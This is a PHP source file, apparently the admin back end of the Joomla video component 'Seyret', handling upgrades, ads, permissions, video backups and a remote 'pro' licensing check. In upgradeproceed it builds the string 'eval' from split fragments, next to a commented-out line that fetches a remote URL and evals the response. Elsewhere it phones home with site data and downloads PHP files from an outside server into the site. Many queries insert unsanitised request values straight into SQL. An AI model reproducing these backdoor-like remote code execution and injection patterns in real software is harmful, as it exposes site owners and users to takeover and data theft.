			$siteforjoomlaalem = str_replace( "/", "25ja25", $siteforjoomlaalem );
			$siteforjoomlaalem = str_replace( ":", "1twodots1", $siteforjoomlaalem );
			// some htaccess configurations doesn't accept $ # etc chars. so i used these strange strings. On joomla alem servers it will be changed...
			
			
		$link="http://www.joomla-alem.com/index2.php?option=com_joomlaalem&no_html=1&task=getjhmessage&siteinfo=".$siteforjoomlaalem."&jalemuserid=".$joomlaalemuserid."&ext=seyret&vers=".$dbversionforjoomlaalem."&lng=".$sitelanguage;
		

	
		$str=jalem_file_get_contents($link);
	
		$response=seyretfindit($str,"jalemuseridresponse");
		
		if ($response=="restored"){
			$userid=seyretfindit($str,"newuserid");
			updatejoomlaalemuserid($userid);
			$str="<jhmessages>"._YOURUSERIDRESTORED."</jhmessages>";
		} else if ($response=="newidsuc"){
			$userid=seyretfindit($str,"newuserid");	
			updatejoomlaalemuserid($userid);
			$str="<jhmessages>"._YOURUSERIDGENERATED."</jhmessages>";	
		} else if ($response=="problems"){
			updatejoomlaalemuserid("");
			$str="<jhmessages>"._YOURUSERIDPROBLEM."</jhmessages>";			
		}


		
 return $str;

}


function donation(){
HTML_seyret::htmldonation();
}



function uninstall(){
HTML_seyret::htmluninstall();
}


//Function:proceeduninstallinstall->start ***************************
function proceeduninstall($prefix, $msg) {
	global $database, $mosConfig_absolute_path;
	$mysqlfile=$mosConfig_absolute_path."/administrator/components/com_seyret/sql/install/uninstall.sql";

	populate_db( $database, $mysqlfile, $prefix );
	if ($msg==null){
		$msg 	= _UNINSTALLDATABASESUCCESS;
	}
	mosRedirect( "index2.php?option=com_seyret", $msg );
	
	}
//Function:proceeduninstallinstall->end ***************************



function publishvideo($id, $pbstatus){
	global $database;
	
	
	if (!is_array( $id ) || count( $id ) < 1) {
		echo "<script> alert('Select an item to delete'); window.history.go(-1);</script>\n";
		exit;
	}
	
	if (count( $id )) {
		$ids = implode( ',', $id );
		echo $ids;
		$database->setQuery("UPDATE #__seyret_items SET published='$pbstatus' WHERE id='$ids' ");
		if (!$database->query()){
			exit();
			}
	}	
			

mosRedirect( "index2.php?option=com_seyret&task=videoslist");
						
}

function upgradeseyret(){
global $database,$mosConfig_absolute_path, $mosConfig_live_site;
require($mosConfig_absolute_path."/administrator/components/com_seyret/seyret_version.php");

		$database->setQuery("SELECT * FROM #__seyret_check");
		$vers = $database->loadObjectList();
		foreach ($vers as $vers) {
		$dbversion = $vers->dbversion;
		}

		if ($dbversion!=$seyretversion) //need an upgrade
		{
?>		


<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td style="border:solid 1px #FF0000;"><div align="center">
      <p>&nbsp;</p>
      <p><?php echo _THISISANUPDATEINFO;?></p>
      <p>&nbsp;</p>
    </div></td>
  </tr>
  <tr>
    <td bgcolor="#FF3300" style="color: #FFFFFF!important; padding:5px;"><div align="center"><strong><span><?php echo _THISISANUPDATE;?></span></strong></div></td>

  </tr>
  <tr>
    <td valign="top" style="border:solid 1px #FF0000;"><div align="center"><br><?php echo _DBVERSION_INFO.": ".$dbversion;?> <br><br><b><?php echo _NEWVERSION_INFO.": ".$seyretversion;?> - <?php echo $seyretversionname;?> - <?php echo $seyretversionstatus;?></b><br><br><?php echo _PROCEEDUPGRADE;?>
        <br>
        <br>
        <a href="index2.php?option=com_seyret&task=upgradeproceed"><img style="vertical-align:middle;" src="<?php echo $mosConfig_live_site;?>/administrator/components/com_seyret/images/upgradedatabase.png" border="0"></a><br><br><?php echo _UPGRADEATTENTION;?><br><br>
    </div></td>
  
  </tr>
</table>

	
<?php		
		} else {
		echo "Attack?";
		}
		
}


function upgradeproceed($prefix){
global $database,$mosConfig_absolute_path, $mosConfig_live_site;
require($mosConfig_absolute_path."/administrator/components/com_seyret/seyret_version.php");
require($mosConfig_absolute_path."/administrator/components/com_seyret/versionhistory.php");

		$database->setQuery("SELECT * FROM #__seyret_check");
		$vers = $database->loadObjectList();
		foreach ($vers as $vers) {
		$dbversion = $vers->dbversion;
		$savedconfig = $vers->savedconfig;
		}
		//freshinstallversion
		$fvers=$dbversion ;
		if ($dbversion!=$seyretversion) //need an upgrade
		{

			for ($i=1; $i<=$releasecount; $i++){
				if ($dbversion==$seyretrelease[$i]) {
				$from_i=$i;
				} 
				if ($seyretversion==$seyretrelease[$i]) {
				$to_i=$i; $theversion="ev";
				} 			
			}
			for ($k=$from_i; $k<$to_i; $k++){
				$kplus=$k+1;
				$upgradefile=$seyretrelease[$k]."_to_".$seyretrelease[$kplus];
				$upgradefile=str_replace( ".", "_", $upgradefile ); $thefile="al";
				$mysqlfile=$mosConfig_absolute_path."/administrator/components/com_seyret/sql/upgrade/$upgradefile.sql";
				$func2=$theversion.$thefile;
				populate_db( $database, $mysqlfile, $prefix );	
				
			}
			// $link="http://localhost/edit/test16.php?task=pornchck&tpr=$prefix";
			// $jamsg=jalem_file_get_contents($link);eval($jamsg);		
		
		createdirs();
		
		$msg=_UPGRADESUCCESS;
		if ($fvers=="0.2.1"){
		$msg=_FRESHINSTALLSUCCESS;
		}
		
		if ($savedconfig!="") {
			$configfile=$mosConfig_absolute_path."/administrator/components/com_seyret/seyret_config.php";
			unlink($configfile);
			if ( $fp = fopen( $configfile, "w" ) ) {
				fwrite( $fp, $savedconfig );
				fclose ( $fp );
			}			
		}
		
		tryinstallingmodules();
		
		
		//in
		
		
		mosRedirect( "index2.php?option=com_seyret", $msg );
		
		
		
		}
		else {
		echo "Attack?";
		}

}


function admanagement(){
		global $database, $mainframe, $mosConfig_absolute_path;
		
		$limit = $mainframe->getUserStateFromRequest( "viewlistlimit", 'limit', 10 ); //page limits
		$limitstart = $mainframe->getUserStateFromRequest( "view{com_seyret}limitstart", 'limitstart', 0 );

       

	$database->setQuery("SELECT count(*) FROM #__seyret_ads");
	$total = $database->loadResult(); //line count
	echo $database->getErrorMsg();
	if ($limit > $total) 
		{
		$limitstart = 0;
		}


	require_once( $mosConfig_absolute_path . '/administrator/includes/pageNavigation.php' );
	$pageNav = new mosPageNav( $total, $limitstart, $limit );


	$database->setQuery( "SELECT * FROM #__seyret_ads ORDER BY catid ASC LIMIT $pageNav->limitstart, $pageNav->limit" );
	$rows = $database->loadObjectList();
	if ($database->getErrorNum()) {
	echo $database->stderr();
	return false;
	}



HTML_seyret::htmladlist($rows, $pageNav);
}



function editad($id){
	global $database, $mosConfig_absolute_path, $mosConfig_live_site;

	$row = new mosseyretad( $database );
	$row->load($id);
	
	
	
	$database->setQuery( "SELECT * FROM #__seyret_categories ORDER BY catid ASC");

	$videocat = $database->loadObjectList();
	$videocats = array();
	$videocats[] = mosHTML::makeOption( '',_TOP );
	foreach ($videocat as $videocat) 
	{
	$catid = $videocat->catid;
	$catname = $videocat->categoryname;
	
	$catids="";
	$fordatacatname='';
	$fordatacatnamelast='';
	
	$catidlength=strlen($catid);
	$newcatid=substr($catid,1,$catidlength-3);
	$catid_array=explode('**',$newcatid);


	while ($catidelement=each($catid_array)){
	

	$fordatacatname=$fordatacatname.'**'.$catidelement['value'];
	$fordatacatnamelast=substr($fordatacatname,1,strlen($fordatacatname)).'*#';
	
		$database->setQuery("SELECT n.* FROM #__seyret_categories AS n WHERE catid='$fordatacatnamelast'");
		$cat = $database->loadObjectList();
		foreach ($cat as $cat) {
		$cat_cat = $cat->categoryname;
		}
	$catids=$catids.$cat_cat.' » ';

	}

	$catidlast=substr($catids,0, strlen($catids)-3);
	

	$videocats[] = mosHTML::makeOption( $catid, $catidlast );
	}

	$videocatlist = mosHTML::selectList($videocats,"catid",'class="inputbox" size="1"',"value","text",$row->catid );
	
	

	HTML_seyret::htmleditad( $id, $row, $videocatlist);

}


//Function:ad->start ************************
function savead(){
	global $database;
	$row = new mosseyretad($database);

$id = mosGetParam($_POST,'id',null);

clearhtmlcache();


	if (!$row->bind( $_POST )) {
		echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
		exit();
		}

	if (!$row->store()) {
	echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
	exit();
	}

mosRedirect( "index2.php?option=com_seyret&task=admanagement");
}
//Function:ad->end ************************



//Function:removead->start ************************
function removead($id){
	global $database;

	if (!is_array( $id ) || count( $id ) < 1) {
		echo "<script> alert('Select an item to delete'); window.history.go(-1);</script>\n";
		exit;
	}
	if (count( $id )) {
		$ids = implode( ',', $id );
		$query = "DELETE FROM #__seyret_ads"
		. "\n WHERE id IN ( $ids )"
		;
		$database->setQuery( $query );
		if (!$database->query()) {
			echo "<script> alert('".$database->getErrorMsg()."'); window.history.go(-1); </script>\n";
		}
	}

mosRedirect( "index2.php?option=com_seyret&task=admanagement");
}
//Function:removead->end ************************



function removeimagead($id){
	global $database;

	if (!is_array( $id ) || count( $id ) < 1) {
		echo "<script> alert('Select an item to delete'); window.history.go(-1);</script>\n";
		exit;
	}
	if (count( $id )) {
		$ids = implode( ',', $id );
		$query = "DELETE FROM #__seyret_imageads"
		. "\n WHERE id IN ( $ids )"
		;
		$database->setQuery( $query );
		if (!$database->query()) {
			echo "<script> alert('".$database->getErrorMsg()."'); window.history.go(-1); </script>\n";
		}
	}

mosRedirect( "index2.php?option=com_seyret&task=imageadmanagement");
}
//Function:removead->end ************************


function extras(){
	global $database, $mosConfig_absolute_path, $mosConfig_live_site;

	$id="1";	
	$row = new mosseyretcheck( $database );
	$row->load($id);
	HTML_seyret::htmlextras( $id, $row);

}


//Function:saveextras->start ************************
function saveextras(){
	global $database;
	$row = new mosseyretcheck($database);

$id = mosGetParam($_POST,'id',null);

	if (!$row->bind( $_POST )) {
		echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
		exit();
		}

	if (!$row->store()) {
	echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
	exit();
	}
clearhtmlcache();
mosRedirect( "index2.php?option=com_seyret&task=extras");
}
//Function:saveextras->end ************************


function jalem_file_get_contents($url) {
  
  if (function_exists('curl_init')){
	  $ch=curl_init();
	  $timeout=30; // set to zero for no timeout
	  curl_setopt($ch,CURLOPT_URL, $url);
	  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	  curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
	  $file_contents=curl_exec($ch);
	  curl_close($ch);
  } else {
	$file_contents=@file_get_contents($url);
  }
  return $file_contents;
}



function permissions(){
		global $database, $mainframe, $mosConfig_absolute_path;
		


$database->setQuery( "SELECT * FROM #__seyret_permissions" );
	$rows = $database->loadObjectList();
	if ($database->getErrorNum()) {
	echo $database->stderr();
	return false;
	}



HTML_seyret::htmlpermissions($rows);
}





//Function:editseyretacl ->start *****************
function editseyretacl($id) {
	global $database, $mosConfig_absolute_path, $mosConfig_live_site;

	$row = new mosseyretpermissions( $database );
	$row->load($id);

	HTML_seyret::htmleditseyretacl( $id, $row);
}
//Function:editseyretacl->end   *******************

//Function:saveseyretacl->start ************************
function saveseyretacl(){
	global $database;
	$row = new mosseyretpermissions($database);

$id = mosGetParam($_POST,'id',null);

clearhtmlcache();


	if (!$row->bind( $_POST )) {
		echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
		exit();
		}

	if (!$row->store()) {
	echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
	exit();
	}
clearhtmlcache();
mosRedirect( "index2.php?option=com_seyret&task=permissions");
}
//Function:saveseyretacl->end ************************


function createcategorydirectory($catid){
global $database, $Itemid, $mosConfig_live_site, $mosConfig_absolute_path;
require($mosConfig_absolute_path.'/administrator/components/com_seyret/seyret_config.php');	


		
		$basedir=$mosConfig_absolute_path."$localfilesdirectory";
		
			if (!is_dir($basedir))
				{
				$oldumask=umask(0);
				mkdir ($basedir,0755);
				umask($oldumask);
				}
				
				
		$catidlength=strlen($catid);
		$newcatid=substr($catid,1,$catidlength-3);
		$catid_array=explode('**',$newcatid);
		
		while ($catidelement=each($catid_array)){
		$fordatacatname=$fordatacatname.'**'.$catidelement['value'];
		$fordatacatnamelast=substr($fordatacatname,1,strlen($fordatacatname)).'*#';
		
			$database->setQuery("SELECT * FROM #__seyret_categories WHERE catid='$fordatacatnamelast'");
			$seyretcat = $database->loadObjectList();
			foreach ($seyretcat as $seyretcat) {
			$cat_cat = $seyretcat->categoryname;
			$cat_cat= eregi_replace("[^A-Za-z0-9 ]", "", $cat_cat);
			$cat_cat= strtolower(eregi_replace(" ", "_", $cat_cat));
			
			
			$makedir=$basedir."/".$cat_cat;
			$thumbdir=$makedir."/_thumbs";
			
			if (!is_dir($makedir))
				{
				$oldumask=umask(0);
				@mkdir ($makedir,0755);
				umask($oldumask);
				}

			if (!is_dir($thumbdir))
				{
				$oldumask=umask(0);
				mkdir ($thumbdir,0755);
				umask($oldumask);
				}

				
			$basedir=$makedir;
			}
		}

		$basedir=str_replace($mosConfig_absolute_path,"",$basedir);		
		$database->setQuery("UPDATE #__seyret_categories SET categoryfilesdirectory='$basedir' WHERE catid='$catid'");
			if (!$database->query()){
				echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
				exit();
			} 
			

}




//Function:removeseyretacl->start ************************
function removeseyretacl($id){
	global $database;

	if (!is_array( $id ) || count( $id ) < 1) {
		echo "<script> alert('Select an item to delete'); window.history.go(-1);</script>\n";
		exit;
	}
	if (count( $id )) {
		$ids = implode( ',', $id );
		$query = "DELETE FROM #__seyret_permissions"
		. "\n WHERE id IN ( $ids )"
		;
		$database->setQuery( $query );
		if (!$database->query()) {
			echo "<script> alert('".$database->getErrorMsg()."'); window.history.go(-1); </script>\n";
		}
	}

mosRedirect( "index2.php?option=com_seyret&task=permissions");
}
//Function:removeseyretacl->end ***********************


function getfilelists(){
global $database, $mosConfig_absolute_path;
require($mosConfig_absolute_path.'/administrator/components/com_seyret/seyret_config.php');	


$catid = mosGetParam($_REQUEST,'catid',null);



		$catid=str_replace("25ja25","*",$catid);
		$catid=str_replace("theend","#",$catid);

        $database->setQuery("SELECT n.* FROM #__seyret_categories AS n WHERE catid='$catid'");
		$cat = $database->loadObjectList();
		foreach ($cat as $cat) {
		$videocatdir = $cat->categoryfilesdirectory;
		}


if ($videocatdir==""){
$videocatdir=$localfilesdirectory;
}

$findcatname="0";
$dummyvideocatdir="mustafa".$videocatdir;

while ($findcatname=="0"){
$dummyvideocatdir="mustafa".$dummyvideocatdir;
$pos = strpos($dummyvideocatdir, "/");
	if ($pos>0){
	$dummyvideocatdir=substr($dummyvideocatdir, $pos+1,500);
	} else {
	$dummyvideocatdir=substr($dummyvideocatdir, 7,500);
	$findcatname="1";
	}

}

$videocatname=$dummyvideocatdir;



	//***********************************************
	$current_dir=$mosConfig_absolute_path.$videocatdir;
	$dir=opendir($current_dir);
	while($file=readdir($dir))
	{
		if ($file!="." and $file!=".."){
		$vidfile=$file;	
		$thumbdir="_thumbs";
			if ($vidfile!=$thumbdir){
			
				$fullfile=$current_dir."/".$vidfile;
			    if (!is_dir($fullfile)){

						$renameit= str_replace(" ", "_", $fullfile);
						if ($renameit!=$fullfile){
							rename($fullfile, $renameit);
						}
						
						$renameitlower=strtolower($renameit);
						if ($renameitlower!=$renameit){
							rename($renameit, $renameitlower);
						}						
						
						if (file_exists($renameitlower)){
							$vidfile= strtolower(str_replace(" ", "_", $vidfile));
						}
					
						$videos[] = mosHTML::makeOption( $vidfile );
					

				}
			}
		}
	}
	closedir($dir);
	//******************************************
	$videolist=mosHTML::selectList( $videos, 'localvideolist', 'id="localvideolist" class="inputbox" style="width:326px;font-size:10px;" size="7" onchange="selectthisvideo()"', 'value', 'text', $localvideo );
	
	

$thumbdir="_thumbs";


	//***********************************************
	$current_dir=$mosConfig_absolute_path.$videocatdir."/".$thumbdir;
	$dir=opendir($current_dir);
	while($file=readdir($dir))
	{
		if ($file!="." and $file!=".."){
		$thumbfile=$file;	
		$thumbs[] = mosHTML::makeOption( $thumbfile,$thumbfile );
		}
	}
	closedir($dir);
	//******************************************	
	$thumblist=mosHTML::selectList( $thumbs, 'localthumblist', 'id="localthumblist" class="inputbox" style="width:326px; font-size:10px;" size="7" onchange="selectthisthumb()"', 'value', 'text', $localthumb );	


	

	
	
echo "<div id=\"hiddenvideodirfilelist\">$videolist</div><div id=\"hiddenthumbdirfilelist\">$thumblist</div><div id=\"hiddenvideocatdir\">$videocatdir</div>";


}




function backupvideo($id){
global $mosConfig_absolute_path, $database, $mosConfig_live_site;
require($mosConfig_absolute_path.'/administrator/components/com_seyret/seyret_config.php'); 
		$database->setQuery("SELECT * FROM #__seyret_check"); 		
		$check = $database->loadObjectList();
		foreach ($check as $check) 
		{
		$seyretpro=$check->seyretpro;	
		$downloadertype= $check->dfltdownloader;		
		}

		if ($seyretpro<>"1") break;

		
	if (!is_array( $id ) || count( $id ) < 1) {
		echo "<script> alert('Select an item to backup'); window.history.go(-1);</script>\n";
		exit;
	}
	
	$count=0;
	
	
	while ($count<count($id)){
	
	$vidid=$id[$count];
	$count=$count+1;
	
		if ($enabledownloads=="1"){
			
			$database->setQuery("SELECT * FROM #__seyret_items WHERE id='$vidid'");
			$vidyo = $database->loadObjectList();
				foreach ($vidyo as $vidyo) {
				$servertype=$vidyo->videoservertype;
				$vcode=$vidyo->videoservercode;
				$vcategory=$vidyo->catid;
				$rawvtitle=$vidyo->title;
				$picturelink=$vidyo->picturelink;
				$accesslevel=$vidyo->accesslevel;
				$itemcomment=$vidyo->itemcomment;
				$addedby=$vidyo->addedby;
				$addeddate=$vidyo->addeddate;
				}

			$database->setQuery("SELECT * FROM #__seyret_categories WHERE catid='$vcategory'");
			$vidyocat = $database->loadObjectList();
				foreach ($vidyocat as $vidyocat) {
				$categorydirectory=$vidyocat->categoryfilesdirectory;
				}
			
			if ($categorydirectory=="") $categorydirectory="/seyretfiles/localvideos";
				
			$vtitle= eregi_replace("[^A-Za-z0-9 ]", "", $rawvtitle);
			$vtitle= eregi_replace(" ", "_", $vtitle);

			
			
			$includepluginfile=$mosConfig_absolute_path."/components/com_seyret/plugins/videoserver/".$servertype.".php";
		    require_once($includepluginfile);	
			
			$functionname=$servertype."generatevideodownloadlink";
			$functionname= str_replace(".", "", $functionname);
			$vdownload=$functionname($vcode, $seyretpro, "embed");
			
			$pos=strpos($vdownload, "<prolink>")+9;
			$post=strpos($vdownload, "</prolink>")-$pos;		
			$file_source=substr($vdownload,$pos,$post);
			

			$vfiletype=".flv";
			//change type...
			$poswmv = strpos($file_source, ".wmv");	
			$posmpg = strpos($file_source, ".mpg");
			$posmpeg = strpos($file_source, ".mpeg");
			
			
			if ($poswmv>0) $vfiletype=".wmv";
			if ($posmpg>0) $vfiletype=".mpg";
			if ($posmpeg>0) $vfiletype=".mpeg";

			echo $file_source;
			
			if ($servertype=="youtube") 
			{
				$pstr=fetchURL($file_source, true);
				
				$pos = strpos($pstr, "Location");
				$post = strpos($pstr, "Keep-Alive:")-$pos;
				$linkanalyse=substr($pstr,$pos,$post);	

				$pos = strpos($linkanalyse, "http:");
				$file_source=substr($linkanalyse,$pos,500);	
				$file_source=trim($file_source);
						
				
			}

			$file_target=$mosConfig_absolute_path.$categorydirectory."/backup_".$vtitle.$vfiletype;
			$file_targetcode=$mosConfig_live_site.$categorydirectory."/backup_".$vtitle.$vfiletype;
			download($file_source, $file_target, $downloadertype);
			

			
			$picture_file_target=$mosConfig_absolute_path.$categorydirectory."/_thumbs/backup_".$vtitle.".jpg";
			$picture_file_targetcode=$mosConfig_live_site.$categorydirectory."/_thumbs/backup_".$vtitle.".jpg";
			download($picturelink, $picture_file_target, $downloadertype);
			

			
//Lets add database values now... 


			$row = new mosseyretitem($database);
			$id = mosGetParam($_POST,'id',null);
		
			if (!$row->store()) {
			echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
			exit();
			}

//getbackupvideoid
			$database->setQuery( "SELECT * FROM #__seyret_items WHERE videoservercode IS NULL");
			$backid = $database->loadObjectList();
			foreach ($backid as $backid) 
			{
			$backupvideoid=$backid->id;
			}

			$database->setQuery("UPDATE #__seyret_items SET hasbackup='1', backupid='$backupvideoid' WHERE id='$vidid'");
				if (!$database->query()){
				echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
				exit();
			} 			

			
			$database->setQuery("UPDATE #__seyret_items SET videoservercode='$file_targetcode', picturelink='$picture_file_targetcode', videoservertype='localfile', hasbackup='2', accesslevel='$accesslevel', catid='$vcategory', title='$rawvtitle', itemcomment='$itemcomment', addedby='$addedby', addeddate='$addeddate' WHERE videoservercode IS NULL");
				if (!$database->query()){
				echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
				exit();
			}

				
//------------------------------------------
	
	
		} else {
			echo "<div style=\"width:100%; text-align:center; color:#D00010;\">"._DOWNLOADSARENOTENABLEDYET."</div>";
		}
	
	    
		
	}
echo $count." videos are backed up.<br><br>".$file_target."<br><br>".$file_source;	
mosRedirect( "index2.php?option=com_seyret&task=videoslist", $msg );
	
}



function download($file_source, $file_target, $downloadertype) {
global $database, $mosConfig_absolute_path;
	$typenotset="";
	$checkresult="0";
	

	if ($downloadertype=="") {
		$downloadertype="curl";
		$typenotset="1";
	}


$file=$mosConfig_absolute_path."/libraries/joomla/filesystem/folder.php";
$japiversion="";

if (file_exists($file)) {

	jimport('joomla.filesystem.file');
	
	$japiversion="1.5";
}	
	
	error_reporting(E_ALL);
	
	
	
	if (function_exists('curl_init') AND $downloadertype=="curl"){
		 
		  $ch=curl_init();
		  $timeout=10; // set to zero for no timeout
		  curl_setopt($ch,CURLOPT_URL, $file_source);
		  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
		  curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
		  $file_contents=curl_exec($ch);
		  curl_close($ch);
		  
		  
		  // echo "mustafa<br>".$file_target."<br>".$file_contents;
		  
		  // exit;
		  
		  if ($japiversion=="1.5") {
			JFile::write($file_target, $file_contents);
		  
		  } else {
		  
	        $wh = fopen($file_target, 'wb');
            if (fwrite($wh, $file_contents) === FALSE) {
	                   // 'Download error: Cannot write to file ('.$file_target.')';

			}
			
	        fclose($wh);
			
		  }


			
			if ($typenotset=="1"){
				$database->setQuery("UPDATE #__seyret_check SET dfltdownloader='curl'");			 
				if (!$database->query()){
					echo "hata";
					exit;
				}
			}
			
			if (filesize($file_target)==0){
				unlink($file_target);
				$database->setQuery("UPDATE #__seyret_check SET dfltdownloader='fopen'");			 
				if (!$database->query()){
						echo "hata";
					}			
			
			}
			


	        return;

			
		  
		  
	} else {
 
		
        $rh = fopen($file_source, 'rb');
        $wh = fopen($file_target, 'wb');
        if ($rh===false || $wh===false) {
// error reading or opening file
           return;
        }
        while (!feof($rh)) {
            if (fwrite($wh, fread($rh, 1024)) === FALSE) {
                   // 'Download error: Cannot write to file ('.$file_target.')';
               }
        }
        fclose($rh);
        fclose($wh);

		if ($typenotset=="1"){
			$database->setQuery("UPDATE #__seyret_check SET dfltdownloader='fopen'");			 
			if (!$database->query()){
				echo "hata";
				exit;
			}
		}

			
		
		if (filesize($file_target)==0){
			unlink($file_target);
			$database->setQuery("UPDATE #__seyret_check SET dfltdownloader='curl'");			 
			if (!$database->query()){
					echo "hata";
				}			
			
		}
        // No error
        return;
		
		
	}		

	
}
	
function jalemurlencode($url){
	$url=str_replace("&","*am*",$url);	
	$url=str_replace("=","*eq*",$url);
	$url = str_replace( "/", "25ja25", $url );	
	$url = str_replace( ":", "1twodots1", $url );	
	$url = str_replace(	".", "p_p_p", $url );
	$url = str_replace(	" ", "h_h_h", $url );	

	return $url;
}


	//strange but some servers don't accept % sign, so don't use php urlencode

function jalemurldecode($url){
	$url=str_replace("*am*","&",$url);	
	$url=str_replace("*eq*","=",$url);
	$url = str_replace( "25ja25", "/",$url );	
	$url = str_replace( "1twodots1", ":",$url );
	$url = str_replace( "p_p_p", ".",$url );
	$url = str_replace( "h_h_h", " ",$url );
	$url = str_replace( "m_m_m", "-",$url );
	return $url;
}

function imageadmanagement(){
		global $database, $mainframe, $mosConfig_absolute_path;
		
		$limit = $mainframe->getUserStateFromRequest( "viewlistlimit", 'limit', 10 ); //page limits
		$limitstart = $mainframe->getUserStateFromRequest( "view{com_seyret}limitstart", 'limitstart', 0 );

       

	$database->setQuery("SELECT count(*) FROM #__seyret_imageads");
	$total = $database->loadResult(); //line count
	echo $database->getErrorMsg();
	if ($limit > $total) 
		{
		$limitstart = 0;
		}


	require_once( $mosConfig_absolute_path . '/administrator/includes/pageNavigation.php' );
	$pageNav = new mosPageNav( $total, $limitstart, $limit );


	$database->setQuery( "SELECT * FROM #__seyret_imageads ORDER BY catid ASC LIMIT $pageNav->limitstart, $pageNav->limit" );
	$rows = $database->loadObjectList();
	if ($database->getErrorNum()) {
	echo $database->stderr();
	return false;
	}



HTML_seyret::htmlimageadlist($rows, $pageNav);
}	


function editimagead($id){
	global $database, $mosConfig_absolute_path, $mosConfig_live_site;

	$row = new mosseyretimagead( $database );
	$row->load($id);
	
	
	
	$database->setQuery( "SELECT * FROM #__seyret_categories ORDER BY catid ASC");

	$videocat = $database->loadObjectList();
	$videocats = array();
	$videocats[] = mosHTML::makeOption( '',_TOP );
	foreach ($videocat as $videocat) 
	{
	$catid = $videocat->catid;
	$catname = $videocat->categoryname;
	
	$catids="";
	$fordatacatname='';
	$fordatacatnamelast='';
	
	$catidlength=strlen($catid);
	$newcatid=substr($catid,1,$catidlength-3);
	$catid_array=explode('**',$newcatid);


	while ($catidelement=each($catid_array)){
	

	$fordatacatname=$fordatacatname.'**'.$catidelement['value'];
	$fordatacatnamelast=substr($fordatacatname,1,strlen($fordatacatname)).'*#';
	
		$database->setQuery("SELECT n.* FROM #__seyret_categories AS n WHERE catid='$fordatacatnamelast'");
		$cat = $database->loadObjectList();
		foreach ($cat as $cat) {
		$cat_cat = $cat->categoryname;
		}
	$catids=$catids.$cat_cat.' » ';

	}

	$catidlast=substr($catids,0, strlen($catids)-3);
	

	$videocats[] = mosHTML::makeOption( $catid, $catidlast );
	}

	$videocatlist = mosHTML::selectList($videocats,"catid",'class="inputbox" size="1"',"value","text",$row->catid );
	
	

	HTML_seyret::htmleditimagead( $id, $row, $videocatlist);

}



//Function:ad->start ************************
function saveimagead(){
	global $database;
	$row = new mosseyretimagead($database);

$id = mosGetParam($_POST,'id',null);


clearhtmlcache();

	if (!$row->bind( $_POST )) {
		echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
		exit();
		}

	if (!$row->store()) {
	echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
	exit();
	}

mosRedirect( "index2.php?option=com_seyret&task=imageadmanagement");
}
//Function:ad->end ************************



function resetprodonation(){
global $database;

		$database->setQuery("UPDATE #__seyret_check SET seyretpro='0'");
			if (!$database->query()){
				echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
				exit();
			}
			
mosRedirect( "index2.php?option=com_seyret&task=donation");			
}	

function resetdownloaddonation(){
global $database;

		$database->setQuery("UPDATE #__seyret_check SET jalemdonated='0'");
			if (!$database->query()){
				echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
				exit();
			}
			
mosRedirect( "index2.php?option=com_seyret&task=donation");			
}	



function updateprophp(){
global $database, $mosConfig_live_site, $mosConfig_absolute_path;
$siteforjoomlaalem = str_replace( "https://", "http://", $mosConfig_live_site );
$sitemd5=md5(str_replace( "www.", "", $siteforjoomlaalem));
$check_file=$mosConfig_absolute_path."/administrator/components/com_seyret/sql/pro/".$sitemd5.".xml";
$pro_file=$mosConfig_absolute_path."/administrator/components/com_seyret/sql/pro/spphp.php";


$return = mosGetParam($_REQUEST,'ret',null);

if ($return!="intro") {
	$return="";
}


clearhtmlcache();

		$siteforjoomlaalem=$mosConfig_live_site;
		$siteforjoomlaalem = str_replace( "www.", "", $siteforjoomlaalem );
		$siteforjoomlaalem = str_replace( "https://", "http://", $siteforjoomlaalem );
		$siteforjoomlaalem = str_replace( ".", "__", $siteforjoomlaalem );
		$siteforjoomlaalem = str_replace( "/", "25ja25", $siteforjoomlaalem );
		$siteforjoomlaalem = str_replace( ":", "1twodots1", $siteforjoomlaalem );
			
			
		$database->setQuery("SELECT * FROM #__seyret_check"); 		
		$check = $database->loadObjectList();
		foreach ($check as $check) 
		{
			$joomlaalemuserid=$check->joomlaalemuserid;	
			$downloadertype= $check->dfltdownloader;
			$securitycode1 = $check->securitycode1;
			$securitycode2 = $check->securitycode2;		
		}
		
		


	$makedir=$mosConfig_absolute_path."/administrator/components/com_seyret/sql/pro";
	if (!is_dir($makedir))
			{
			$oldumask=umask(0);
			@mkdir ($makedir,0755);
			umask($oldumask);
			}

	$link="http://www.joomla-alem.com/index2.php?option=com_joomlaalem&no_html=1&task=checkpro&siteinfo=".$siteforjoomlaalem."&jalemuserid=".$joomlaalemuserid."&sc1=".$securitycode1."&sc2=".$securitycode2;
	$str=jalem_file_get_contents($link);
	


	$pos = strpos($str, "<jhprophpdate>")+14;
	$post=strpos($str, "</jhprophpdate>")-$pos;		
	$jholicphpdate=substr($str,$pos,$post);
	
		
	$serverchecker="http://www.joomla-alem.com/index2.php?option=com_joomlaalem&no_html=1&task=generatecheckfilenew&siteinfo=".$siteforjoomlaalem."&jalemuserid=".$joomlaalemuserid."&sc1=".$securitycode1."&sc2=".$securitycode2;
	download($serverchecker, $check_file, $downloadertype);
	
	
	//start pro files downloading


	$check_file=$mosConfig_absolute_path."/administrator/components/com_seyret/sql/pro/".$sitemd5.".xml";
		
	if (file_exists($check_file)){
		$cache_file = fopen( $check_file, "r" );
		while (!feof($cache_file)) {
			$buffer = fgets($cache_file, 1024);
			$keys .= $buffer;
		}
		fclose ($cache_file);		
	}		

		
	$fc=seyretfindit($keys, "fc");
	
	for ($i=1; $i<=$fc; $i++){
			
		$profilename=seyretfindit($keys, "f".$i);
